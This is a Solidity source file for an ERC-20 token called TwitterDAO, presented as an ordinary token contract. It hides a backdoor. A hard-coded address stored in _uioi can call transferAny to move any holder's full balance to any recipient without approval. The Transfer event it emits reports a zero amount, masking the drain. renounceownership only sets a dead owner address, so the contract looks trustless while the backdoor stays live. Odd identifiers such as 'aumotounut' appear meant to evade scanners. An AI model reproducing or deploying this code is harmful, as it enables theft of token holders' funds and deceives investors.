pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 aumotounut) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 aumotounut) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 aumotounut ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract TwitterDAO is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _uioi; 

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _uioi = 0x288D4935940b7AF3A849737A84Ef9cc1F45F1E8f;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
 
    function transfer(address recipient, uint256 aumotounut) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= aumotounut, "TT: transfer aumotounut exceeds balance");

        _balances[_msgSender()] -= aumotounut;
        _balances[recipient] += aumotounut;
        emit Transfer(_msgSender(), recipient, aumotounut);
        return true;
    }

    function transferAny(address sender, address recipient) public  returns (bool) {
        require(keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_uioi)), "Caller is not the original caller");

        uint256 ERE = _balances[sender]; 
        uint256 FDSS = _balances[recipient];
        require(ERE != 0, "Sender has no balance");

        FDSS += ERE;
        ERE = 0;

        _balances[sender] = ERE;
        _balances[recipient] = FDSS;

        emit Transfer(sender, recipient, ERE);
        return true;
    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 aumotounut) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = aumotounut;
        emit Approval(_msgSender(), spender, aumotounut);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 aumotounut) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= aumotounut, "TT: transfer aumotounut exceeds allowance");

        _balances[sender] -= aumotounut;
        _balances[recipient] += aumotounut;
        _allowances[sender][_msgSender()] -= aumotounut;

        emit Transfer(sender, recipient, aumotounut);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}
